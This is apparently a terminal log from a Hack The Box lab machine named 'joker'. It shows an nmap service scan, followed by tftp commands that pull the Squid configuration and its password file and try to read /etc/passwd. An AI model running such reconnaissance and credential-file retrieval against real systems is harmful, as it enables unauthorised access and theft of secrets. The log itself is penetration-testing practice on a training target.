┌─[root@parrot]─[~/hackthebox/joker]       
└──╼ #mkdir nmap                           
┌─[root@parrot]─[~/hackthebox/joker]       
└──╼ #nmap -sC -sV -oA nmap/joker 10.10.10.21                                          
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-31 23:49 EST                        
Nmap scan report for 10.10.10.21           
Host is up (0.67s latency).                
Not shown: 998 filtered ports              
PORT     STATE SERVICE    VERSION          
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:                             
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)                         
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)                        
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)                      
3128/tcp open  http-proxy Squid http proxy 3.5.12                                      
|_http-server-header: squid/3.5.12         
|_http-title: ERROR: The requested URL could not be retrieved                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .              
Nmap done: 1 IP address (1 host up) scanned in 89.35 seconds                           
┌─[root@parrot]─[~/hackthebox/joker]       
└──╼ #tftp 10.10.10.21                     
tftp> get /etc/passwd
Error code 2: Access violation             
tftp> get /etc/squid/squid.conf            
Received 295428 bytes in 187.4 seconds     
tftp> get /etc/squid/passwords             
Received 48 bytes in 0.2 seconds           
tftp> get /etc/iptables/rules.v4           
Error code 2: Access violation             
tftp>                
